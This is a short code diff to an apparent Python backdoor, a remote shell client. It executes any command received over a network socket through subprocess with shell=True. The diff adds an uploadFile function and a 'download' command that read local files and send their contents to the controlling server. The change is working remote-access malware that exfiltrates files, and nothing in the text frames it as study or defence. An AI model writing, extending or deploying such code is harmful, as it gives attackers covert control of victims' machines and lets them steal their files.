@@ -39,6 +39,11 @@ def downloadFileRecv(fileName):
     s.settimeout(None)
     f.close()
 
+# Upload file to the server's fyle system
+def uploadFile(fileName):
+    f = open(fileName, 'rb') # Open the file on 'read bytes' mode
+    s.send(f.read())
+
 def shell():
     while True:
 
@@ -58,6 +63,9 @@ def shell():
 
         elif command[:6] == 'upload':
             downloadFileRecv(command[7:])
+
+        elif command[:8] == 'download':
+            uploadFile(command[9:])
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
